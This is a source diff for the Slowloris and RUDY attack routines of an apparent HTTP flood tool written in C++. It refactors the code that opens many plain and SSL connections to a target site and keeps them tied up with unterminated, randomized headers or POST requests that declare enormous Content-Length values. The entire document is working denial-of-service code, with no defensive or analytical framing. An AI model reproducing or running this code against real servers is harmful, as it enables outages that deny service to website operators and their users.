@@ -1,98 +1,76 @@
 #include <netdb.h>
-#include <cstring>
-#include <utility>
 #include <openssl/ssl.h>
 
 #include "../Headers/Slowloris.hpp"
 
-void Slowloris::attack(const int *id) {
-    int r;
+void Slowloris::attack() {
     std::vector<int> sockets;
-    std::vector<bool> keep_alive;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
-    keep_alive.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.emplace_back(0);
-        keep_alive.emplace_back(false);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
+            httphdr header{};
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
-                keep_alive[x] = false;
+                init_header(&header);
             }
-            std::string header{};
-            init_header(header, keep_alive[x]);
-            if((r = write_socket(sockets[x], header.c_str(), static_cast<int>(header.length()))) == -1){
+
+            if((write_socket(sockets[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
-                keep_alive[x] = false;
+                init_header(&header);
             }else{
-                keep_alive[x] = true;
+                Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                (*conf->req)++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        (*conf->voly)++;
         pause();
     }
 }
 
-void Slowloris::attack_ssl(const int *id) {
-    int r;
+void Slowloris::attack_ssl() {
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
-    std::vector<bool> keep_alive;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
-    keep_alive.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.emplace_back(0);
         SSLs.emplace_back(nullptr);
         CTXs.emplace_back(nullptr);
-        keep_alive.emplace_back(false);
     }
     while(true) {
-        static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
+            httphdr header{};
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
-                keep_alive[x] = false;
+                init_header(&header);
             }
-            std::string header{};
-            init_header(header, keep_alive[x]);
-            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
+
+            if((write_socket(SSLs[x], header.get(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
-                keep_alive[x] = false;
+                init_header(&header);
             }else{
-                keep_alive[x] = true;
+                Randomizer::randomstr((std::string&)*(&header));
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                (*conf->req)++;
             }
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        (*conf->voly)++;
         pause();
     }
 }
@@ -101,58 +79,36 @@ Slowloris::Slowloris(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf))
 
 }
 
-void Slowloris::init_header(std::string& header, bool keep_alive) {
+void Slowloris::init_header(httphdr *header) {
+
     switch (conf->vector){
-        case Config::Slowloris:{
-            if(keep_alive){
-                header += "X-a: "
-                          + std::to_string(Randomizer::randomInt(1, 5000))
-                          + " \r\n";
-            }else{
-                header += Randomizer::random_method() + " /";
-                if(conf->RandomizeHeader){
-                    header += Randomizer::randomstr();
-                }
-                header += " HTTP/1.0\r\nUser-Agent: "
-                          + Randomizer::random_useragent(*(conf->useragents))
-                          + " \r\nCache-Control: " + Randomizer::random_caching()
-                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
-                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
-                          + " \r\nReferer: " + Randomizer::random_referer()
-                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
-                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
-                          + " \r\nAccept: */*"
-                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
-                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
-                          + " \r\n";
-            }
+        case Config::Slowloris:
+            Randomizer::random_method(header->method);
             break;
-        }
-        case Config::Rudy:{
-            if(keep_alive){
-                header += Randomizer::randomstr();
-            }else{
-                header += "POST /";
-                if(conf->RandomizeHeader){
-                    header += Randomizer::randomstr();
-                }
-                header += " HTTP/1.0\r\nUser-Agent: "
-                          + Randomizer::random_useragent(*(conf->useragents))
-                          + " \r\nCache-Control: " + Randomizer::random_caching()
-                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
-                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
-                          + " \r\nReferer: " + Randomizer::random_referer()
-                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
-                          + " \r\nContent-Length: " + std::to_string(Randomizer::randomInt(100000000, 1000000000))
-                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
-                          + " \r\nAccept: */*"
-                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
-                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
-                          + " \r\n";
-            }
+        case Config::Rudy:
+            header->method = "POST";
+            header->content_length = Randomizer::randomInt(100000000, 1000000000);
             break;
-        }
         default:break;
     }
+    if(conf->RandomizeHeader){
+         Randomizer::randomstr(header->path);
+    }
+    Randomizer::random_useragent(*(conf->useragents), header->useragent);
+    Randomizer::random_caching(header->cache_control);
+    Randomizer::random_encoding(header->encoding);
+    Randomizer::random_charset(header->charset[0]);
+    Randomizer::random_charset(header->charset[1]);
+    Randomizer::random_referer(header->referer);
+    header->accept = "*/*";
+    header->connection_type = "Keep-Alive";
+    Randomizer::random_contenttype(header->content_type);
+    Randomizer::randomstr(header->cookie[0]);
+    Randomizer::randomstr(header->cookie[1]);
+    header->keep_alive = Randomizer::randomInt(1, 5000);
+    header->DNT = Randomizer::randomInt(0, 1);
+
+    header->generate_unterminated();
+
 }
 
